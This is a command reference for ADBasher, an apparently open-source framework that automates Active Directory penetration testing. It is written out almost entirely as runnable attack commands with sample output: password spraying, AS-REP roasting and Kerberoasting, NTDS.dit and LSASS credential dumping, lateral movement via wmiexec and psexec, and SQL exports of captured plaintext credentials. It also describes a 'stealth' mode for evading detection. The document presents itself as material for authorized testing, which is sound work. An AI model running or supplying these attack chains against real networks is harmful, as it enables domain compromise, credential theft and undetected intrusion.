# ADBasher Command Reference

Complete command reference for the ADBasher automated Active Directory penetration testing framework.

---

## Overview

ADBasher is an **orchestration framework** that automates Active Directory penetration testing by coordinating multiple specialized tools (CrackMapExec, Impacket, BloodHound) into a unified, unattended workflow. This guide documents both high-level automation commands and individual module usage.

### Quick Navigation

- [Main CLI Commands](#main-cli-commands)
- [Automated Workflows](#automated-workflows)
- [Individual Modules](#individual-modules)
- [Session Management](#session-management)
- [Database Queries](#database-queries)

---

## Main CLI Commands

### Basic Usage

```bash
# Full automated assessment (all phases)
./adbasher.py --target <DOMAIN_OR_IP>

# Target multiple domains or networks
./adbasher.py --target example.local corp.local 192.168.1.0/24

# Stealth mode (slower, lockout-safe, harder to detect)
./adbasher.py --target example.local --opsec stealth

# Aggressive mode (faster, noisier - lab environments only)
./adbasher.py --target example.local --opsec aggressive

# Resume previous session
./adbasher.py --resume <SESSION_ID>
```

### Command-Line Arguments

| Argument        | Required | Description                                     | Examples                                      |
| --------------- | -------- | ----------------------------------------------- | --------------------------------------------- |
| `--target`      | Yes\*    | Target domain(s), IP(s), or CIDR(s)             | `example.local`, `10.0.0.1`, `192.168.1.0/24` |
| `--opsec`       | No       | OpSec mode: `standard`, `stealth`, `aggressive` | Default: `standard`                           |
| `--resume`      | No       | Resume existing session by ID                   | `--resume abc12345`                           |
| `--skip-phases` | No       | Skip specific phases (comma-separated)          | `--skip-phases recon,persistence`             |

\* `--target` required unless using `--resume`

---

## Automated Workflows

### What Happens During Execution

When you run `./adbasher.py --target example.local`, ADBasher automatically executes the following phases:

#### Phase 1: Reconnaissance (No Credentials)

**Modules Executed**:

- `1 nocreds/discover_domain.py` - DNS SRV record enumeration
- `1 nocreds/ldap_anonymous_bind.py` - LDAP anonymous user enumeration
- `1 nocreds/smb_null_enum.py` - SMB null session enumeration

**Underlying Tools Called**:

- `nslookup`, `dig` (DNS queries)
- `ldapsearch` (LDAP enumeration)
- `enum4linux-ng`, `crackmapexec` (SMB enumeration)

**Output Examples**:

```text
[Phase 1] Reconnaissance
  -> DNS Discovery: example.local
  ✓ Found DC: DC01.example.local (192.168.1.10)
  -> LDAP Anonymous Bind: 192.168.1.10
  ✓ Enumerated: 250 users
  -> SMB Null Sessions: 192.168.1.0/24
  ✓ Found 5 systems allowing null sessions
```

#### Phase 2: Credential Attacks (Valid Usernames)

**Modules Executed**:

- `3 nopass/automated/asreproast.py` - AS-REP roasting
- `3 nopass/automated/password_spray.py` - Password spraying
- `3 nopass/automated/kerberoast.py` - Kerberoasting (if creds found)

**Underlying Tools Called**:

- `GetNPUsers.py` (Impacket - AS-REP roasting)
- `crackmapexec smb` (Password spraying)
- `GetUserSPNs.py` (Impacket - Kerberoasting)

**Output Examples**:

```text
[Phase 2] Credential Attacks
  -> AS-REP Roast: example.local
  ✓ Found 2 accounts with pre-auth disabled
  ✓ Hashes saved: ~/.adbasher/sessions/abc12345/asrep_hashes.txt

  -> Password Spray: 250 users × 7 passwords
  ✓ Valid: EXAMPLE\\jdoe:Password123
  ✓ Valid: EXAMPLE\\asmith:Welcome1

  -> Kerberoast: example.local (using jdoe credentials)
  ✓ Captured 4 TGS tickets
  ✓ Hashes saved: ~/.adbasher/sessions/abc12345/kerberoast_hashes.txt
```

#### Phase 3: Admin Detection & Post-Exploitation

**Modules Executed**:

- `6 validcreds/automated/check_admin.py` - Admin privilege detection
- `6 validcreds/automated/bloodhound_collect.py` - BloodHound collection
- `6 validcreds/automated/secretsdump_auto.py` - NTDS.dit dumping
- `6 validcreds/automated/lsass_dump.py` - LSASS memory dumping

**Underlying Tools Called**:

- `crackmapexec smb --local-auth` (Admin checks)
- `bloodhound-python` (BloodHound collection)
- `secretsdump.py` (Impacket - NTDS dumping)
- `lsassy`, `procdump` (LSASS dumping)

**Output Examples**:

```text
[Phase 3] Admin Detection
  -> Checking privileges: jdoe
  ✓ Admin access: 12/87 systems

[Phase 4] Post-Exploitation (AUTO-TRIGGERED)
  -> BloodHound Collection: example.local
  ✓ Data saved: ~/.adbasher/sessions/abc12345/bloodhound_data/20241212_example.zip

  -> Secretsdump: DC01 (jdoe has admin)
  ✓ Extracted 250 NTLM hashes
  ✓ Hashes saved: ~/.adbasher/sessions/abc12345/ntds_hashes.txt
```

#### Phase 5: Lateral Movement

**Modules Executed**:

- `6 validcreds/automated/lateral_movement.py` - Multi-method execution

**Underlying Tools Called**:

- `wmiexec.py` (Impacket)
- `psexec.py` (Impacket)
- `smbexec.py` (Impacket)

**Output Examples**:

```text
[Phase 5] Lateral Movement
  -> WMIExec: 25 targets
  ✓ Success: 12/25 hosts
  ✓ Command executed: whoami
```

#### Phase 6: Reporting

**Modules Executed**:

- `reporting/html_report.py` - Report generation

**Output Examples**:

```text
[Phase 6] Reporting
  ✓ HTML Report: ~/.adbasher/sessions/abc12345/report.html
  ✓ Markdown Report: ~/.adbasher/sessions/abc12345/report.md
```

---

## Individual Modules

For advanced users who need fine-grained control, ADBasher modules can be executed individually.

### Reconnaissance Modules

#### Domain Discovery

```bash
python3 "1 nocreds/discover_domain.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target example.local
```

**What it does**: Queries DNS SRV records to find domain controllers  
**Underlying command**: `nslookup -type=SRV _ldap._tcp.dc._msdcs.example.local`

#### LDAP Anonymous Enumeration

```bash
python3 "1 nocreds/ldap_anonymous_bind.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --target 192.168.1.10
```

**What it does**: Attempts LDAP anonymous bind to enumerate users  
**Underlying command**: `ldapsearch -x -h 192.168.1.10 -b "DC=example,DC=local"`

### Credential Attack Modules

#### AS-REP Roasting

```bash
python3 "3 nopass/automated/asreproast.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain example.local \
  --dc-ip 192.168.1.10
```

**What it does**: Requests AS-REP hashes for accounts with Kerberos pre-authentication disabled  
**Underlying command**: `GetNPUsers.py example.local/ -dc-ip 192.168.1.10 -request -format hashcat -outputfile hashes.txt`

#### Password Spraying

```bash
python3 "3 nopass/automated/password_spray.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain example.local \
  --dc-ip 192.168.1.10 \
  --username-file users.txt \
  --passwords Password123 Welcome1 Summer2024
```

**What it does**: Tests common passwords against all domain users with lockout protection  
**Underlying command**: `crackmapexec smb 192.168.1.10 -u users.txt -p Password123 --continue-on-success`

#### Kerberoasting

```bash
python3 "3 nopass/automated/kerberoast.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain example.local \
  --dc-ip 192.168.1.10 \
  --username jdoe \
  --password Password123
```

**What it does**: Requests TGS tickets for service accounts to crack offline  
**Underlying command**: `GetUserSPNs.py example.local/jdoe:Password123 -dc-ip 192.168.1.10 -request -outputfile hashes.txt`

### Post-Exploitation Modules

#### BloodHound Collection

```bash
python3 "6 validcreds/automated/bloodhound_collect.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain example.local \
  --dc-ip 192.168.1.10 \
  --username jdoe \
  --password Password123
```

**What it does**: Collects AD relationship data for attack path analysis  
**Underlying command**: `bloodhound-python -d example.local -u jdoe -p Password123 -dc 192.168.1.10 -c All --zip`

#### NTDS.dit Dumping (Secretsdump)

```bash
python3 "6 validcreds/automated/secretsdump_auto.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain example.local \
  --dc-ip 192.168.1.10 \
  --username jdoe \
  --password Password123
```

**What it does**: Dumps NTDS.dit database containing all domain password hashes  
**Underlying command**: `secretsdump.py example.local/jdoe:Password123@192.168.1.10`

#### Admin Privilege Check

```bash
python3 "6 validcreds/automated/check_admin.py" \
  --session-dir ~/.adbasher/sessions/<SESSION_ID> \
  --domain example.local \
  --username jdoe \
  --password Password123
```

**What it does**: Checks if credentials have local admin on discovered systems  
**Underlying command**: `crackmapexec smb 192.168.1.0/24 -u jdoe -p Password123 --local-auth`

---

## Session Management

### Session Directory Structure

Every ADBasher execution creates a timestamped session directory:

```text
~/.adbasher/sessions/<SESSION_ID>/
├── session.db                    # SQLite database (all findings)
├── session_<timestamp>.log       # Human-readable logs
├── session_<timestamp>.json.log  # SIEM-compatible JSON logs
├── report.html                   # Interactive HTML report
├── report.md                     # Markdown report
├── bloodhound_data/              # BloodHound ZIP files
├── asrep_hashes.txt              # AS-REP roasting results
├── kerberoast_hashes.txt         # Kerberoasting TGS tickets
├── ntds_hashes.txt               # Secretsdump output
└── users.txt                     # Enumerated usernames
```

### Finding Your Session ID

```bash
# List all sessions
ls -lt ~/.adbasher/sessions/

# View most recent session
ls -lt ~/.adbasher/sessions/ | head -n 2

# Resume most recent session
LATEST_SESSION=$(ls -t ~/.adbasher/sessions/ | head -n 1)
./adbasher.py --resume $LATEST_SESSION
```

### Session Artifacts

| File/Directory          | Description                                                    | Usage                    |
| ----------------------- | -------------------------------------------------------------- | ------------------------ |
| `session.db`            | SQLite database with all targets, credentials, vulnerabilities | Query with `sqlite3`     |
| `session_*.log`         | Human-readable logs with Rich formatting                       | Review execution flow    |
| `session_*.json.log`    | JSON-formatted logs for SIEM ingestion                         | Import to Splunk/ELK     |
| `bloodhound_data/*.zip` | BloodHound data files                                          | Upload to BloodHound GUI |
| `*_hashes.txt`          | Captured password hashes                                       | Crack with Hashcat/John  |
| `report.html`           | Professional HTML report                                       | Share with stakeholders  |

---

## Database Queries

ADBasher stores all findings in a SQLite database for easy querying and analysis.

### Opening the Database

```bash
# Open database (replace SESSION_ID)
sqlite3 ~/.adbasher/sessions/<SESSION_ID>/session.db
```

### Common Queries

#### View All Discovered Targets

```sql
SELECT ip, hostname, os_version, is_dc
FROM targets
ORDER BY is_dc DESC, ip;
```

#### List Valid Credentials

```sql
SELECT domain, username, password, source, is_admin
FROM credentials
WHERE is_valid = 1
ORDER BY is_admin DESC;
```

#### Find Admin Credentials Only

```sql
SELECT domain, username, password, source
FROM credentials
WHERE is_admin = 1;
```

#### View All Vulnerabilities

```sql
SELECT name, severity, affected_host, description
FROM vulnerabilities
ORDER BY
  CASE severity
    WHEN 'CRITICAL' THEN 1
    WHEN 'HIGH' THEN 2
    WHEN 'MEDIUM' THEN 3
    WHEN 'LOW' THEN 4
  END;
```

#### Export Credentials to CSV

```bash
sqlite3 -header -csv ~/.adbasher/sessions/<SESSION_ID>/session.db \
  "SELECT * FROM credentials WHERE is_valid=1;" > credentials.csv
```

---

## OpSec Modes Comparison

ADBasher supports three operational security modes that balance speed vs stealth:

| Feature               | Standard           | Stealth           | Aggressive            |
| --------------------- | ------------------ | ----------------- | --------------------- |
| **Speed**             | Moderate           | Slow              | Fast                  |
| **Detection Risk**    | Medium             | Low               | High                  |
| **Lockout Risk**      | Low                | Very Low          | Medium-High           |
| **Timing Jitter**     | 5-30s              | 30-120s           | 0-5s                  |
| **Parallel Threads**  | 5                  | 1                 | 25                    |
| **Password Attempts** | 3 per cycle        | 1-2 per cycle     | 5+ per cycle          |
| **Network Scan Rate** | T3 (normal)        | T2 (polite)       | T5 (insane)           |
| **Recommended Use**   | Production pentest | Red team exercise | Lab environments only |

### Mode Selection Guide

```bash
# Production penetration test (5-10 day engagement)
./adbasher.py --target corp.local --opsec standard

# Long-term red team (30-90 days, evade detection)
./adbasher.py --target corp.local --opsec stealth

# Lab testing, training, compliance audit (speed priority)
./adbasher.py --target lab.local --opsec aggressive
```

---

## Comparison: ADBasher vs Manual Tools

### Reconnaissance Phase

| Task                    | ADBasher Command                                | Manual Alternative                                                     |
| ----------------------- | ----------------------------------------------- | ---------------------------------------------------------------------- |
| Find domain controllers | `./adbasher.py --target corp.local` (automatic) | `nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local`                   |
| Enumerate users         | Automatic (Phase 1)                             | `ldapsearch -x -h 10.0.0.1 -b "DC=corp,DC=local" "(objectClass=user)"` |
| SMB enumeration         | Automatic (Phase 1)                             | `enum4linux-ng -A 10.0.0.1`                                            |

### Credential Attacks

| Task              | ADBasher Command                  | Manual Alternative                                        |
| ----------------- | --------------------------------- | --------------------------------------------------------- |
| AS-REP roasting   | Automatic (Phase 2)               | `GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -request`      |
| Password spraying | Automatic with lockout protection | `crackmapexec smb 10.0.0.1 -u users.txt -p passwords.txt` |
| Kerberoasting     | Automatic when creds found        | `GetUserSPNs.py corp.local/user:pass -request`            |

### Post-Exploitation

| Task                  | ADBasher Command           | Manual Alternative                                       |
| --------------------- | -------------------------- | -------------------------------------------------------- |
| BloodHound collection | Automatic when creds found | `bloodhound-python -d corp.local -u user -p pass -c All` |
| NTDS dumping          | Automatic when admin found | `secretsdump.py corp.local/admin:pass@DC01`              |
| Lateral movement      | Automatic multi-method     | `wmiexec.py corp.local/admin:pass@10.0.0.50`             |

---

## Troubleshooting

### Common Issues

**Issue**: `crackmapexec: command not found`  
**Solution**: Install dependencies: `sudo apt install crackmapexec`

**Issue**: `GetUserSPNs.py: command not found`  
**Solution**: Install Impacket: `sudo apt install impacket-scripts` or `pip3 install impacket`

**Issue**: Database locked errors  
**Solution**: Kill lingering processes: `pkill -f adbasher && rm ~/.adbasher/sessions/*/session.db-journal`

**Issue**: No credentials found after password spray  
**Solution**: Check logs in `session_*.log`, verify DC connectivity, try custom password list

### Debug Mode

Enable verbose logging by editing `core/config.yaml`:

```yaml
global:
  log_level: DEBUG # Change from INFO
```

Then review detailed logs:

```bash
tail -f ~/.adbasher/sessions/<SESSION_ID>/session_*.log
```

---

## Next Steps

- **[ADBasher vs Manual Workflows](ADBASHER_VS_MANUAL.md)** - Decision guide
- **[Main Documentation](AD_PENETRATION_TESTING_GUIDE.md)** - Full penetration testing guide
- **[Case Studies](sections/08_case_studies.md)** - Real-world examples

---

**Note**: ADBasher is an orchestration framework. It automates proven tools (Impacket, CrackMapExec, BloodHound) into a cohesive workflow. Understanding the underlying tools is still valuable for troubleshooting and manual interventions.
